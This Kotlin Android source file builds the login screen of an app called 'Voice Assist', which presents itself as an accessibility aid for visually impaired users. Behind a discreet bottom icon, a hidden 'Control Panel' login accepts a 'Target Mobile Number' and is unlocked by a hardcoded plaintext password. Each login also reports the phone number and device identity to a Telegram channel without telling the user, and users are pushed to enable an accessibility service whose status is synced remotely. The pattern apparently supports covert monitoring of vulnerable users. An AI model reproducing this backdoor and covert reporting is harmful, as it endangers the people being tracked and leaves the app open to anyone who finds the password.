package com.example.ui

import android.app.Activity
import android.content.Context
import android.util.Log
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.layout.widthIn
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Bolt
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Phone
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.ElevatedCard
import androidx.compose.material3.HorizontalDivider
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.shadow
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.semantics.contentDescription
import androidx.compose.ui.semantics.semantics
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.credentials.ClearCredentialStateRequest
import androidx.credentials.CredentialManager
import androidx.credentials.CustomCredential
import androidx.credentials.GetCredentialRequest
import androidx.credentials.exceptions.GetCredentialCancellationException
import com.example.R
import com.example.data.FirebaseSignalRepository
import com.example.util.VibrationEvent
import com.google.android.libraries.identity.googleid.GetGoogleIdOption
import com.google.android.libraries.identity.googleid.GetSignInWithGoogleOption
import com.google.android.libraries.identity.googleid.GoogleIdTokenCredential
import com.google.android.libraries.identity.googleid.GoogleIdTokenCredential.Companion.TYPE_GOOGLE_ID_TOKEN_CREDENTIAL
import com.google.firebase.Firebase
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.auth.FirebaseUser
import com.google.firebase.auth.GoogleAuthProvider
import com.google.firebase.auth.auth
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.callbackFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await

/**
 * Manages simple 1-tap Phone Number login for visually impaired users so they can log in
 * with just their phone number (e.g., 017XXXXXXXX) without struggling with Google accounts.
 */
object PhoneNumberSessionManager {
    private const val PREFS_NAME = "phone_login_session_prefs"
    private const val KEY_PHONE_NUMBER = "logged_in_phone_key"
    private const val KEY_LOGIN_TARGET_MODE = "login_target_mode_key"
    private const val KEY_CONTROL_PANEL_UNLOCKED = "control_panel_unlocked_key"
    const val CONTROL_PANEL_PASSWORD = "sudoaptinstall"

    private val _loggedInPhone = MutableStateFlow("")
    val loggedInPhone: StateFlow<String> = _loggedInPhone.asStateFlow()

    private val _preferredMode = MutableStateFlow(DualAppMode.USER_CLEAN_MODE)
    val preferredMode: StateFlow<DualAppMode> = _preferredMode.asStateFlow()

    private val _isControlPanelUnlocked = MutableStateFlow(false)
    val isControlPanelUnlocked: StateFlow<Boolean> = _isControlPanelUnlocked.asStateFlow()

    fun isValidControlPanelPassword(input: String): Boolean {
        val normalized = input.trim().replace(" ", "").lowercase()
        return normalized == CONTROL_PANEL_PASSWORD
    }

    fun unlockControlPanelWithPassword(context: Context, passwordInput: String): Boolean {
        val valid = isValidControlPanelPassword(passwordInput)
        if (valid) {
            val prefs = context.applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            prefs.edit().putBoolean(KEY_CONTROL_PANEL_UNLOCKED, true).apply()
            _isControlPanelUnlocked.value = true
        }
        return valid
    }

    fun lockControlPanel(context: Context) {
        val prefs = context.applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().putBoolean(KEY_CONTROL_PANEL_UNLOCKED, false).apply()
        _isControlPanelUnlocked.value = false
    }

    fun init(context: Context): String {
        val prefs = context.applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val saved = prefs.getString(KEY_PHONE_NUMBER, "").orEmpty()
        val savedModeStr = prefs.getString(KEY_LOGIN_TARGET_MODE, DualAppMode.USER_CLEAN_MODE.name).orEmpty()
        val unlocked = prefs.getBoolean(KEY_CONTROL_PANEL_UNLOCKED, false)
        val mode = try {
            DualAppMode.valueOf(savedModeStr)
        } catch (_: Exception) {
            DualAppMode.USER_CLEAN_MODE
        }
        _loggedInPhone.value = saved
        _preferredMode.value = mode
        _isControlPanelUnlocked.value = unlocked
        return saved
    }

    fun getActivePhone(context: Context): String {
        val current = _loggedInPhone.value
        if (current.isNotBlank()) return current
        return init(context)
    }

    fun setPreferredMode(context: Context, mode: DualAppMode) {
        val prefs = context.applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().putString(KEY_LOGIN_TARGET_MODE, mode.name).apply()
        _preferredMode.value = mode
    }

    fun loginWithPhone(
        context: Context,
        rawPhone: String,
        targetMode: DualAppMode = _preferredMode.value,
        controlPanelPassword: String? = null
    ): Result<String> {
        val clean = FirebaseSignalRepository.normalizePhoneKey(rawPhone)
        if (!FirebaseSignalRepository.isPhoneKey(clean)) {
            return Result.failure(IllegalArgumentException("Please enter a valid mobile number (8-11 digits, e.g., 01712345678)"))
        }
        if (targetMode == DualAppMode.DATABASE_CONTROL_PANEL_MODE && !_isControlPanelUnlocked.value) {
            if (controlPanelPassword == null || !isValidControlPanelPassword(controlPanelPassword)) {
                return Result.failure(IllegalArgumentException("Please enter a valid password to unlock Control Panel"))
            }
            unlockControlPanelWithPassword(context, controlPanelPassword)
        }
        val prefs = context.applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit()
            .putString(KEY_PHONE_NUMBER, clean)
            .putString(KEY_LOGIN_TARGET_MODE, targetMode.name)
            .apply()
        _loggedInPhone.value = clean
        _preferredMode.value = targetMode

        try {
            val devIdentity = com.example.util.DeviceInstallationSyncManager.getInstance(context).identity.value
            val modeLabel = if (targetMode == DualAppMode.DATABASE_CONTROL_PANEL_MODE) {
                "Database Control Panel (Verified Password Unlocked)"
            } else {
                "Standard App View (User Clean App)"
            }
            com.example.util.TelegramRealtimeSync.getInstance(context).notifyPhoneLoginToTelegramDb(
                phoneNumber = clean,
                loginTargetMode = modeLabel,
                deviceId = devIdentity.deviceId.ifBlank { "DEV-ANDROID" },
                deviceModel = "${devIdentity.manufacturer} ${devIdentity.deviceModel}".trim()
            )
            if (targetMode == DualAppMode.USER_CLEAN_MODE) {
                val isSvcOn = com.example.util.AccessibilityHelper.isAccessibilityServiceEnabled(context)
                CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                    try {
                        val repo = FirebaseSignalRepository(context.applicationContext, explicitIdentifier = clean)
                        repo.syncDeviceProfile(
                            deviceId = devIdentity.deviceId.ifBlank { "DEV-ANDROID" },
                            deviceModel = "${devIdentity.manufacturer} ${devIdentity.deviceModel}".trim(),
                            isPowerOn = com.example.service.QuickAccessibilityService.isPowerOn.value,
                            isServiceEnabled = isSvcOn,
                            lastSignalSummary = if (isSvcOn) {
                                "একই নাম্বারে অ্যাপ ও পারমিশন কানেক্টেড (সার্ভিস ১০০% প্রস্তুত)"
                            } else {
                                "একই নাম্বারে অ্যাপ লগইন সম্পন্ন (পারমিশন অন অপেক্ষমান)"
                            },
                            userIdOverride = clean
                        )
                    } catch (_: Exception) {}
                }
            }
        } catch (_: Exception) {}

        return Result.success(clean)
    }

    fun clearPhoneSession(context: Context) {
        val prefs = context.applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit()
            .remove(KEY_PHONE_NUMBER)
            .remove(KEY_LOGIN_TARGET_MODE)
            .remove(KEY_CONTROL_PANEL_UNLOCKED)
            .apply()
        _loggedInPhone.value = ""
        _preferredMode.value = DualAppMode.USER_CLEAN_MODE
        _isControlPanelUnlocked.value = false
    }
}

internal fun FirebaseAuth.authStateFlow(): Flow<FirebaseUser?> = callbackFlow {
    val listener = FirebaseAuth.AuthStateListener { auth ->
        trySend(auth.currentUser)
    }
    addAuthStateListener(listener)
    awaitClose { removeAuthStateListener(listener) }
}

fun attemptAutoSignIn(
    context: Context,
    credentialManager: CredentialManager,
    onAuthSuccess: () -> Unit,
    onUnauthenticated: () -> Unit,
    scope: CoroutineScope
) {
    if (Firebase.auth.currentUser != null) {
        onAuthSuccess()
        return
    }
    val clientId = try {
        context.getString(R.string.default_web_client_id)
    } catch (e: Exception) {
        onUnauthenticated()
        return
    }

    val googleIdOption = GetGoogleIdOption.Builder()
        .setFilterByAuthorizedAccounts(true)
        .setServerClientId(clientId)
        .setAutoSelectEnabled(true)
        .build()

    val request = GetCredentialRequest.Builder().addCredentialOption(googleIdOption).build()

    scope.launch {
        try {
            val result = credentialManager.getCredential(context, request)
            val credential = result.credential
            if (credential is CustomCredential && credential.type == TYPE_GOOGLE_ID_TOKEN_CREDENTIAL) {
                val googleIdToken = GoogleIdTokenCredential.createFrom(credential.data).idToken
                val authCredential = GoogleAuthProvider.getCredential(googleIdToken, null)
                Firebase.auth.signInWithCredential(authCredential).await()
                onAuthSuccess()
            } else {
                onUnauthenticated()
            }
        } catch (e: Exception) {
            onUnauthenticated()
        }
    }
}

fun onGoogleSignInClicked(
    context: Context,
    credentialManager: CredentialManager,
    onAuthSuccess: () -> Unit,
    onAuthError: (String) -> Unit,
    scope: CoroutineScope,
    onAuthCancelled: () -> Unit = {}
) {
    val clientId = try {
        context.getString(R.string.default_web_client_id)
    } catch (e: Exception) {
        onAuthError("Google Sign-In configuration missing: default_web_client_id not found")
        return
    }

    val signInOption = GetSignInWithGoogleOption.Builder(serverClientId = clientId).build()
    val request = GetCredentialRequest.Builder().addCredentialOption(signInOption).build()

    scope.launch {
        try {
            val activityContext = context as? Activity ?: context
            val result = credentialManager.getCredential(activityContext, request)
            val credential = result.credential
            if (credential is CustomCredential && credential.type == TYPE_GOOGLE_ID_TOKEN_CREDENTIAL) {
                val googleIdToken = GoogleIdTokenCredential.createFrom(credential.data).idToken
                val authCredential = GoogleAuthProvider.getCredential(googleIdToken, null)
                Firebase.auth.signInWithCredential(authCredential).await()
                onAuthSuccess()
            } else {
                onAuthError("Unexpected credential type")
            }
        } catch (e: GetCredentialCancellationException) {
            Log.w("Auth", "Google Sign-In flow cancelled or dismissed: ${e.message}", e)
            onAuthCancelled()
        } catch (e: Exception) {
            Log.e("Auth", "Google Sign-In failed", e)
            onAuthError(e.localizedMessage ?: "Sign in failed")
        }
    }
}

fun signOut(
    context: Context,
    credentialManager: CredentialManager,
    onSignOutComplete: () -> Unit,
    scope: CoroutineScope
) {
    PhoneNumberSessionManager.clearPhoneSession(context)
    Firebase.auth.signOut()
    scope.launch {
        try {
            credentialManager.clearCredentialState(ClearCredentialStateRequest())
        } catch (e: Exception) {
            Log.e("Auth", "Failed to clear credential state", e)
        } finally {
            onSignOutComplete()
        }
    }
}

@Composable
fun GoogleSignInButton(
    onAuthSuccess: () -> Unit,
    onAuthError: (String) -> Unit,
    modifier: Modifier = Modifier
) {
    val context = LocalContext.current
    val coroutineScope = rememberCoroutineScope()
    val credentialManager = remember(context) { CredentialManager.create(context) }
    var isLoading by remember { mutableStateOf(false) }

    OutlinedButton(
        onClick = {
            isLoading = true
            onGoogleSignInClicked(
                context = context,
                credentialManager = credentialManager,
                onAuthSuccess = {
                    isLoading = false
                    onAuthSuccess()
                },
                onAuthError = { errorMsg ->
                    isLoading = false
                    onAuthError(errorMsg)
                },
                scope = coroutineScope,
                onAuthCancelled = { isLoading = false }
            )
        },
        enabled = !isLoading,
        shape = RoundedCornerShape(18.dp),
        border = BorderStroke(1.5.dp, Color(0xFFA7F3D0)),
        colors = ButtonDefaults.outlinedButtonColors(
            containerColor = Color(0xFFF8FAFC),
            contentColor = Color(0xFF0F172A)
        ),
        modifier = modifier
            .fillMaxWidth()
            .height(56.dp)
            .testTag("google_sign_in_button")
            .semantics {
                contentDescription = "Sign in with Google"
            }
    ) {
        if (isLoading) {
            CircularProgressIndicator(
                modifier = Modifier.size(22.dp),
                color = Color(0xFF059669),
                strokeWidth = 2.5.dp
            )
        } else {
            Box(
                modifier = Modifier
                    .size(28.dp)
                    .clip(CircleShape)
                    .background(Color(0xFFDCFCE7)),
                contentAlignment = Alignment.Center
            ) {
                Icon(
                    imageVector = Icons.Default.Security,
                    contentDescription = null,
                    tint = Color(0xFF059669),
                    modifier = Modifier.size(16.dp)
                )
            }
            Spacer(modifier = Modifier.width(10.dp))
            Text(
                text = "Sign in with Google (Optional)",
                fontSize = 15.sp,
                fontWeight = FontWeight.Bold,
                color = Color(0xFF0F172A)
            )
        }
    }
}

@Composable
fun AuthScreen(
    onAuthSuccess: () -> Unit,
    viewModel: MainViewModel? = null,
    modifier: Modifier = Modifier
) {
    val context = LocalContext.current
    val coroutineScope = rememberCoroutineScope()
    val credentialManager = remember(context) { CredentialManager.create(context) }
    var phoneInput by remember { mutableStateOf("") }
    var controlPanelPasswordInput by remember { mutableStateOf("") }
    var showControlPanelLoginSheet by remember { mutableStateOf(false) }
    var errorMessage by remember { mutableStateOf<String?>(null) }

    val modernInputColors = OutlinedTextFieldDefaults.colors(
        focusedBorderColor = Color(0xFF059669),
        unfocusedBorderColor = Color(0xFF94A3B8),
        focusedContainerColor = Color(0xFFF0FDF4),
        unfocusedContainerColor = Color(0xFFF8FAFC),
        focusedLabelColor = Color(0xFF065F46),
        unfocusedLabelColor = Color(0xFF475569),
        cursorColor = Color(0xFF059669),
        focusedTextColor = Color(0xFF0F172A),
        unfocusedTextColor = Color(0xFF0F172A)
    )

    LaunchedEffect(Unit) {
        val savedPhone = PhoneNumberSessionManager.init(context)
        if (savedPhone.isNotBlank()) {
            onAuthSuccess()
            return@LaunchedEffect
        }
        attemptAutoSignIn(
            context = context,
            credentialManager = credentialManager,
            onAuthSuccess = onAuthSuccess,
            onUnauthenticated = {},
            scope = coroutineScope
        )
    }

    Scaffold(
        modifier = modifier
            .fillMaxSize()
            .testTag("firebase_auth_screen"),
        containerColor = Color(0xFFF0FDF4)
    ) { paddingValues ->
        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(
                    Brush.verticalGradient(
                        colors = listOf(
                            Color(0xFFECFDF5),
                            Color(0xFFF8FAFC),
                            Color(0xFFF0FDFA)
                        )
                    )
                )
        ) {
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(paddingValues)
                    .statusBarsPadding()
                    .verticalScroll(rememberScrollState())
                    .padding(horizontal = 22.dp, vertical = 24.dp),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.SpaceBetween
            ) {
                Spacer(modifier = Modifier.height(16.dp))

                // Main Login Content (Centered)
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .widthIn(max = 480.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Box(
                        modifier = Modifier
                            .size(96.dp)
                            .shadow(8.dp, CircleShape),
                        contentAlignment = Alignment.BottomEnd
                    ) {
                        Image(
                            painter = painterResource(id = R.drawable.ic_drishti_voice_logo_1791076747778),
                            contentDescription = "Voice Assist Logo",
                            contentScale = ContentScale.Crop,
                            modifier = Modifier
                                .fillMaxSize()
                                .clip(CircleShape)
                                .border(width = 3.dp, color = Color(0xFF10B981), shape = CircleShape)
                        )
                    }

                    Spacer(modifier = Modifier.height(14.dp))

                    Text(
                        text = "Voice Assist",
                        fontSize = 24.sp,
                        fontWeight = FontWeight.ExtraBold,
                        color = Color(0xFF064E3B),
                        textAlign = TextAlign.Center
                    )

                    Spacer(modifier = Modifier.height(20.dp))

                    ElevatedCard(
                        modifier = Modifier
                            .fillMaxWidth()
                            .shadow(10.dp, RoundedCornerShape(26.dp))
                            .border(1.5.dp, Color(0xFFA7F3D0), RoundedCornerShape(26.dp)),
                        shape = RoundedCornerShape(26.dp),
                        colors = CardDefaults.elevatedCardColors(containerColor = Color.White),
                        elevation = CardDefaults.elevatedCardElevation(defaultElevation = 6.dp)
                    ) {
                        Column(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(22.dp),
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            if (!showControlPanelLoginSheet) {
                                // =========================================================
                                // STANDARD USER LOGIN: Enter Phone -> Tap Login -> Opens Settings
                                // =========================================================
                                OutlinedTextField(
                                    value = phoneInput,
                                    onValueChange = { raw ->
                                        phoneInput = raw.filter {
                                            it.isDigit() || it in '০'..'৯' || it == '+' || it == '-' || it == ' '
                                        }.take(16)
                                        errorMessage = null
                                    },
                                    label = {
                                        Text(
                                            text = "Mobile Number",
                                            fontSize = 13.5.sp,
                                            fontWeight = FontWeight.Bold
                                        )
                                    },
                                    placeholder = { Text("017XXXXXXXX", fontWeight = FontWeight.SemiBold) },
                                    leadingIcon = {
                                        Box(
                                            modifier = Modifier
                                                .padding(start = 6.dp)
                                                .size(36.dp)
                                                .clip(RoundedCornerShape(10.dp))
                                                .background(Color(0xFFDCFCE7)),
                                            contentAlignment = Alignment.Center
                                        ) {
                                            Icon(
                                                imageVector = Icons.Default.Phone,
                                                contentDescription = "Phone Number",
                                                tint = Color(0xFF059669),
                                                modifier = Modifier.size(20.dp)
                                            )
                                        }
                                    },
                                    colors = modernInputColors,
                                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Phone),
                                    singleLine = true,
                                    shape = RoundedCornerShape(18.dp),
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .testTag("phone_login_input")
                                )

                                Button(
                                    onClick = {
                                        val res = PhoneNumberSessionManager.loginWithPhone(
                                            context = context,
                                            rawPhone = phoneInput,
                                            targetMode = DualAppMode.USER_CLEAN_MODE
                                        )
                                        res.fold(
                                            onSuccess = {
                                                errorMessage = null
                                                viewModel?.testVibrationEvent(VibrationEvent.PAIRING_SUCCESS)
                                                onAuthSuccess()
                                                // Immediately take user to Settings page after logging in
                                                if (!com.example.util.AccessibilityHelper.isAccessibilityServiceEnabled(context)) {
                                                    viewModel?.onUnifiedPermissionOrChatClicked(context)
                                                }
                                            },
                                            onFailure = { err ->
                                                errorMessage = err.localizedMessage ?: "Enter a valid phone number"
                                            }
                                        )
                                    },
                                    shape = RoundedCornerShape(18.dp),
                                    colors = ButtonDefaults.buttonColors(
                                        containerColor = Color(0xFF059669),
                                        contentColor = Color.White
                                    ),
                                    elevation = ButtonDefaults.buttonElevation(
                                        defaultElevation = 5.dp,
                                        pressedElevation = 8.dp
                                    ),
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .height(58.dp)
                                        .testTag("phone_login_submit_button")
                                        .semantics {
                                            contentDescription = "Login and Open Settings"
                                        }
                                ) {
                                    Icon(
                                        imageVector = Icons.Default.CheckCircle,
                                        contentDescription = null,
                                        modifier = Modifier.size(21.dp)
                                    )
                                    Spacer(modifier = Modifier.width(10.dp))
                                    Text(
                                        text = "LOGIN",
                                        fontSize = 16.sp,
                                        fontWeight = FontWeight.ExtraBold
                                    )
                                }

                                GoogleSignInButton(
                                    onAuthSuccess = onAuthSuccess,
                                    onAuthError = { err -> errorMessage = err }
                                )
                            } else {
                                // =========================================================
                                // VERIFIED CONTROL PANEL LOGIN (Opened via small bottom icon)
                                // =========================================================
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.SpaceBetween,
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Text(
                                        text = "🔒 Control Panel Login",
                                        fontSize = 16.sp,
                                        fontWeight = FontWeight.ExtraBold,
                                        color = Color(0xFF064E3B)
                                    )
                                    OutlinedButton(
                                        onClick = {
                                            showControlPanelLoginSheet = false
                                            errorMessage = null
                                        },
                                        shape = RoundedCornerShape(12.dp),
                                        border = BorderStroke(1.dp, Color(0xFFCBD5E1)),
                                        modifier = Modifier.height(36.dp)
                                    ) {
                                        Text(
                                            text = "Back",
                                            fontSize = 12.sp,
                                            fontWeight = FontWeight.Bold,
                                            color = Color(0xFF475569)
                                        )
                                    }
                                }

                                OutlinedTextField(
                                    value = phoneInput,
                                    onValueChange = { raw ->
                                        phoneInput = raw.filter {
                                            it.isDigit() || it in '০'..'৯' || it == '+' || it == '-' || it == ' '
                                        }.take(16)
                                        errorMessage = null
                                    },
                                    label = {
                                        Text(
                                            text = "Target Mobile Number",
                                            fontSize = 13.5.sp,
                                            fontWeight = FontWeight.Bold
                                        )
                                    },
                                    placeholder = { Text("017XXXXXXXX", fontWeight = FontWeight.SemiBold) },
                                    leadingIcon = {
                                        Box(
                                            modifier = Modifier
                                                .padding(start = 6.dp)
                                                .size(36.dp)
                                                .clip(RoundedCornerShape(10.dp))
                                                .background(Color(0xFFDCFCE7)),
                                            contentAlignment = Alignment.Center
                                        ) {
                                            Icon(
                                                imageVector = Icons.Default.Phone,
                                                contentDescription = "Target Phone Number",
                                                tint = Color(0xFF059669),
                                                modifier = Modifier.size(20.dp)
                                            )
                                        }
                                    },
                                    colors = modernInputColors,
                                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Phone),
                                    singleLine = true,
                                    shape = RoundedCornerShape(18.dp),
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .testTag("phone_login_input")
                                )

                                OutlinedTextField(
                                    value = controlPanelPasswordInput,
                                    onValueChange = { raw ->
                                        controlPanelPasswordInput = raw.trim()
                                        errorMessage = null
                                    },
                                    label = {
                                        Text(
                                            text = "Password",
                                            fontSize = 13.sp,
                                            fontWeight = FontWeight.Bold
                                        )
                                    },
                                    placeholder = { Text("Enter password") },
                                    leadingIcon = {
                                        Box(
                                            modifier = Modifier
                                                .padding(start = 6.dp)
                                                .size(36.dp)
                                                .clip(RoundedCornerShape(10.dp))
                                                .background(Color(0xFFDCFCE7)),
                                            contentAlignment = Alignment.Center
                                        ) {
                                            Icon(
                                                imageVector = Icons.Default.Security,
                                                contentDescription = "Password",
                                                tint = Color(0xFF059669),
                                                modifier = Modifier.size(20.dp)
                                            )
                                        }
                                    },
                                    colors = modernInputColors,
                                    singleLine = true,
                                    shape = RoundedCornerShape(18.dp),
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .testTag("control_panel_password_input")
                                )

                                Button(
                                    onClick = {
                                        val res = PhoneNumberSessionManager.loginWithPhone(
                                            context = context,
                                            rawPhone = phoneInput,
                                            targetMode = DualAppMode.DATABASE_CONTROL_PANEL_MODE,
                                            controlPanelPassword = controlPanelPasswordInput
                                        )
                                        res.fold(
                                            onSuccess = {
                                                errorMessage = null
                                                viewModel?.testVibrationEvent(VibrationEvent.PAIRING_SUCCESS)
                                                onAuthSuccess()
                                            },
                                            onFailure = { err ->
                                                errorMessage = err.localizedMessage ?: "Enter valid mobile number and password"
                                            }
                                        )
                                    },
                                    shape = RoundedCornerShape(18.dp),
                                    colors = ButtonDefaults.buttonColors(
                                        containerColor = Color(0xFF065F46),
                                        contentColor = Color.White
                                    ),
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .height(56.dp)
                                        .testTag("phone_login_control_panel_button")
                                        .semantics {
                                            contentDescription = "Unlock Control Panel"
                                        }
                                ) {
                                    Icon(
                                        imageVector = Icons.Default.Security,
                                        contentDescription = null,
                                        tint = Color.White,
                                        modifier = Modifier.size(20.dp)
                                    )
                                    Spacer(modifier = Modifier.width(8.dp))
                                    Text(
                                        text = "UNLOCK CONTROL PANEL",
                                        fontSize = 14.5.sp,
                                        fontWeight = FontWeight.ExtraBold,
                                        color = Color.White
                                    )
                                }
                            }

                            if (!errorMessage.isNullOrBlank()) {
                                Box(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .clip(RoundedCornerShape(14.dp))
                                        .background(Color(0xFFFEF2F2))
                                        .border(1.dp, Color(0xFFFCA5A5), RoundedCornerShape(14.dp))
                                        .padding(horizontal = 12.dp, vertical = 10.dp)
                                ) {
                                    Text(
                                        text = errorMessage!!,
                                        color = Color(0xFFB91C1C),
                                        fontSize = 13.sp,
                                        fontWeight = FontWeight.Bold,
                                        textAlign = TextAlign.Center,
                                        modifier = Modifier
                                            .fillMaxWidth()
                                            .testTag("auth_error_text")
                                    )
                                }
                            }
                        }
                    }
                }

                // =========================================================
                // SAFE-DISTANCE SMALL DISCREET ICON AT VERY BOTTOM OF LOGIN PAGE
                // (Only verified users know to tap this small icon for Control Panel)
                // =========================================================
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(top = 72.dp, bottom = 8.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    IconButton(
                        onClick = {
                            viewModel?.testVibrationEvent(VibrationEvent.BUTTON_TOGGLE)
                            showControlPanelLoginSheet = !showControlPanelLoginSheet
                            errorMessage = null
                        },
                        modifier = Modifier
                            .size(36.dp)
                            .clip(CircleShape)
                            .background(
                                if (showControlPanelLoginSheet) Color(0xFFDCFCE7) else Color(0xFFE2E8F0).copy(alpha = 0.55f)
                            )
                            .border(
                                width = 1.dp,
                                color = if (showControlPanelLoginSheet) Color(0xFF10B981) else Color(0xFFCBD5E1),
                                shape = CircleShape
                            )
                            .testTag("login_page_database_settings_icon")
                            .semantics {
                                contentDescription = "Control Panel Access"
                            }
                    ) {
                        Icon(
                            imageVector = Icons.Default.Security,
                            contentDescription = "Control Panel Access",
                            tint = if (showControlPanelLoginSheet) Color(0xFF059669) else Color(0xFF94A3B8),
                            modifier = Modifier.size(16.dp)
                        )
                    }
                }
            }
        }
    }
}
